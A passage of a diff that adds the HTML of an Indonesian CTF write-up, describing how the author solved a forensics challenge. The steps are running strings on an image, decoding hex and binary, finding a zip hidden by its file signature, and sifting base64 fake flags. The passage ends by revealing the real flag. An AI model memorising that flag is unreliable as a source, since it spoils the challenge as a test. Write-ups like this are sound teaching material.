+        data-src="/images/slashroot8_foren1-02.png"
+        data-srcset="/images/slashroot8_foren1-02.png, /images/slashroot8_foren1-02.png 1.5x, /images/slashroot8_foren1-02.png 2x"
+        data-sizes="auto"
+        alt="/images/slashroot8_foren1-02.png"
+        title="Find The Key-02" width="302" height="172" /></p>
+<ul>
+<li>Analisis selanjutnya yaitu mengecek bagian human readable dari file tersebut dengan <code>strings</code>.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/slashroot8_foren1-03.png"
+        data-srcset="/images/slashroot8_foren1-03.png, /images/slashroot8_foren1-03.png 1.5x, /images/slashroot8_foren1-03.png 2x"
+        data-sizes="auto"
+        alt="/images/slashroot8_foren1-03.png"
+        title="Find The Key-03" width="955" height="705" /></p>
+<ul>
+<li>Nampak sebuah flag tapi formatnya salah, terbukti ketika dicoba submit, baik dengan kelebihan <strong>r</strong> atau pun tidak hasilnya tetap incorrect.</li>
+<li>Saya coba decode nilai hex di bawahnya, flagnya masih incorrect.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/slashroot8_foren1-04.png"
+        data-srcset="/images/slashroot8_foren1-04.png, /images/slashroot8_foren1-04.png 1.5x, /images/slashroot8_foren1-04.png 2x"
+        data-sizes="auto"
+        alt="/images/slashroot8_foren1-04.png"
+        title="Find The Key-04" width="951" height="111" /></p>
+<ul>
+<li>Kemudian, saya coba kode binary yang di bawahnya, berikut hasil konversi ke ascii (text).</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/slashroot8_foren1-05.png"
+        data-srcset="/images/slashroot8_foren1-05.png, /images/slashroot8_foren1-05.png 1.5x, /images/slashroot8_foren1-05.png 2x"
+        data-sizes="auto"
+        alt="/images/slashroot8_foren1-05.png"
+        title="Find The Key-05" width="831" height="517" /></p>
+<ul>
+<li>Hmm, sebuah flag juga, tapi ketika coba submit masih incorrect.</li>
+<li>Saya coba decode nilai hex yang di atas flag awal, hasilnya adalah <code>admin123</code>.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/slashroot8_foren1-06.png"
+        data-srcset="/images/slashroot8_foren1-06.png, /images/slashroot8_foren1-06.png 1.5x, /images/slashroot8_foren1-06.png 2x"
+        data-sizes="auto"
+        alt="/images/slashroot8_foren1-06.png"
+        title="Find The Key-06" width="596" height="97" /></p>
+<ul>
+<li>Sejenak saya berpikir mungkin saja itu sebuah password, but for what ?? Apakah ini sebuah file archive yang diproteksi password ?</li>
+<li>Saya coba cari nilai hex yang relevan dengan file signature zip yaitu <code>50 4B 03 04</code>, ternyata ada dong dan itu <strong>berulang sebanyak 4 kali</strong>.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/slashroot8_foren1-07.png"
+        data-srcset="/images/slashroot8_foren1-07.png, /images/slashroot8_foren1-07.png 1.5x, /images/slashroot8_foren1-07.png 2x"
+        data-sizes="auto"
+        alt="/images/slashroot8_foren1-07.png"
+        title="Find The Key-07" width="986" height="472" /></p>
+<ul>
+<li>Ketika file signaturenya diganti dari jpg ke zip beneran bisa dong.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/slashroot8_foren1-08.png"
+        data-srcset="/images/slashroot8_foren1-08.png, /images/slashroot8_foren1-08.png 1.5x, /images/slashroot8_foren1-08.png 2x"
+        data-sizes="auto"
+        alt="/images/slashroot8_foren1-08.png"
+        title="Find The Key-08" width="775" height="275" /></p>
+<ul>
+<li>Saya coba baca isi file tersebut, rata-rata semuanya di-encode menggunakan base64 dan ternyata di dalamnya ada banyak sekali flag palsu. Sampai pada akhirnya, alhamdulillah saya berhasil ketemu flag aslinya sebelum nilai binary.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/slashroot8_foren1-09.png"
+        data-srcset="/images/slashroot8_foren1-09.png, /images/slashroot8_foren1-09.png 1.5x, /images/slashroot8_foren1-09.png 2x"
+        data-sizes="auto"
+        alt="/images/slashroot8_foren1-09.png"
+        title="Find The Key-09" width="960" height="655" /></p>
+<ul>
+<li>Waduh… banyak bgt fake flagnya (foren berasa osint ini mah awokwkwk)</li>
+</ul>
+<h3 id="flag-5">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>slashroot8{Y4n9_b1k1n_s04l_m4s1h_p3mul4}</strong></div>
+        </div>
+    </div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-09-30</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">Ctf</a>,&nbsp;<a href="/tags/national/">National</a>,&nbsp;<a href="/tags/forensic/">Forensic</a>,&nbsp;<a href="/tags/joy/">Joy</a>,&nbsp;<a href="/tags/reverse/">Reverse</a>,&nbsp;<a href="/tags/web-exploit/">Web Exploit</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2024/08/hacktrace-ranges-ctf-2024-quals-writeup-full-boot2root/" class="prev" rel="prev" title="Hacktrace-Ranges CTF 2024 Quals Writeup [Full Boot2Root]"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Hacktrace-Ranges CTF 2024 Quals Writeup [Full Boot2Root]</a>
+            <a href="/2025/01/install-arch-linux-from-scratch-with-kde-plasma/" class="next" rel="next" title="Install Arch Linux from Scratch with KDE Plasma">Install Arch Linux from Scratch with KDE Plasma<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2025</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/auto-render.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/copy-tex.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js"></script></body>
+</html>
